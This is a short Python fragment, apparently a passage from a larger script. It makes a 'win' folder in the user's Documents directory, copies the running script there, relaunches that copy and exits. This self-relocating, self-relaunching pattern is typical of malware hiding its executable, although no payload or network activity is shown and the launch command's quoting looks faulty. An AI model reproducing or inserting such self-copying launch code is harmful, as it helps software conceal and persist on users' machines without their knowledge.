os.mkdir('C:\\Users\\'+os.getlogin()+'\\Documents\\win')
shutil.copy(sys.argv[0].split('\\')[::-1][0],'C:\\Users\\'+os.getlogin()+'\\Documents\\win')
os.system('start "C:\\Users\\'+os.getlogin()+'\\Documents\\win\\'+sys.argv[0].split('\\')[::-1][0]+'"')
sys.exit()